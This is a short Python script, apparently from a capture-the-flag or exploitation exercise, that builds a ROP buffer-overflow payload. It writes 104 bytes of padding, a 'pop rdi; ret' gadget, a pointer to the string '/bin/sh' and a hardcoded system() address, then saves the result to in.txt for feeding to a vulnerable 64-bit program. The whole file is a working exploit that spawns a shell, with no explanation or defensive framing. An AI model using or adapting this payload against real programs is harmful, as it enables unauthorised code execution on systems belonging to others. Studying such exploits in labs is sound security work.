#!/usr/bin/env python

from struct import *

buf = ""
buf += "A"*104
buf += pack("<Q", 0x00000000004006bb)       # pop rdi; ret;
buf += pack("<Q", 0x40070f)                 # pointer to "/bin/sh"
buf += pack("<Q", 0x7ffff7a7f420)           # system() address

f = open("in.txt", "w")
f.write(buf)